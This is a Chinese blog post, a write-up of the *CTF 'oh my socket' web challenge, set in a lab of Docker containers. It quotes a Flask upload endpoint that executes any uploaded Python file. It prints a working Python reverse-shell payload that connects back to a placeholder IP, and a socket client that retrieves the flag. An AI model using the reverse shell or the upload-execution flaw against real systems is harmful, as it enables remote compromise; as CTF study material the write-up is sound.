@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl oh my socket题目分析： 直接给了一堆docker 先跑起来看看是什么 docker-compose up -d 跑起来了三个容器 分别是 server client webserver 先整理下网络环境情况： webserver 172.21.0.4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF&#x2F;*CTF web4">
+<meta property="og:url" content="https://polosec.github.io/2021/01/18/XCTF-CTF-web4/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl oh my socket题目分析： 直接给了一堆docker 先跑起来看看是什么 docker-compose up -d 跑起来了三个容器 分别是 server client webserver 先整理下网络环境情况： webserver 172.21.0.4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/xingctf.png">
+<meta property="article:published_time" content="2021-01-18T11:51:30.000Z">
+<meta property="article:modified_time" content="2021-01-18T12:26:01.085Z">
+<meta property="article:author" content="Polo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/xingctf.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XCTF/*CTF web4</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/12/22/%E8%BF%91%E6%9C%9Fssti/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&text=XCTF/*CTF web4"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&is_video=false&description=XCTF/*CTF web4"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XCTF/*CTF web4&body=Check out this article: https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&name=XCTF/*CTF web4&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&t=XCTF/*CTF web4"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#oh-my-socket"><span class="toc-number">1.</span> <span class="toc-text">oh my socket</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XCTF/*CTF web4
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-18T11:51:30.000Z" itemprop="datePublished">2021-01-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl</p>
+<h1 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh my socket"></a>oh my socket</h1><p>题目分析：</p>
+<p>直接给了一堆docker 先跑起来看看是什么</p>
+<p>docker-compose up -d</p>
+<p>跑起来了三个容器 分别是 server client webserver</p>
+<p>先整理下网络环境情况：</p>
+<p>webserver 172.21.0.4</p>
+<p>server 172.21.0.2</p>
+<p>client 172.21.0.3</p>
+<p>首先访问webserver</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> STDOUT, check_output</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        f.save(os.path.join(f.filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output = check_output([<span class="string">&#x27;python3&#x27;</span>, f.filename], stderr=STDOUT, timeout=<span class="number">80</span>)</span><br><span class="line">            content = output.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = e.__str__()</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;rm&#x27;</span>, f.filename]))</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>通过对源码进行审计 发现上传文件后会执行文件里面的内容，于是尝试反弹shell，上传如下脚本：</p>
+<p>这里请注意理解该段代码的作用，和bash -i那个的原理相似，都是将std out std in std err重定向至socket。</p>
+<p>详细的分析链接放在了最后面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os </span><br><span class="line"> </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>本地监听搞起来，然后上传，得到反弹过来的shell</p>
+<p>下面审计server.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = <span class="built_in">open</span>(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag的条件是发送的数据为b’*ctf’</p>
+<p>发现这个socket写的有些问题，连接大于2时就断开了，所以需要尝试自己写个socket连进去，防止别人在连，要一直循环。</p>
+<p>于是得到如下client的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">&#x27;172.25.0.2&#x27;</span></span><br><span class="line">PORT=<span class="number">21587</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST,PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	data=<span class="string">b&#x27;*ctf&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	tcpCliSock.send(data)</span><br><span class="line">	data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure>
+
+<p>但是有个问题，题目的服务器每两分钟重启一次，拿到shell后再装vim什么的太慢了，于是将脚本base64编码，</p>
+<p>echo base64_encoded_script | base64 -d &gt;1.py</p>
+<p>以这种方式将脚本内容上传至webserver，python3 1.py执行即可。</p>
+<img src="http://cdn.polowong.top/static/images/xingctf.png">
+
+<p>我认为client.py 和client的容器是起迷惑作用 或者说是模拟别人在向server发送请求，所以在本地模拟时把client容器down掉就可以了。</p>
+<p>为了验证这里一理论，我在题目的在线环境中通过webserver打到client服务器进行了LFI，发现并没有client.py，我认为上述说法成立。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当前还有个问题就是不知道是哪句话实现了删除文件前执行了文件里的内容。</p>
+<p>参考链接：</p>
+<p>雪宝wp</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30526593/article/details/98650248">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#oh-my-socket"><span class="toc-number">1.</span> <span class="toc-text">oh my socket</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&text=XCTF/*CTF web4"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&is_video=false&description=XCTF/*CTF web4"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XCTF/*CTF web4&body=Check out this article: https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&title=XCTF/*CTF web4"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&name=XCTF/*CTF web4&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2021/01/18/XCTF-CTF-web4/&t=XCTF/*CTF web4"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
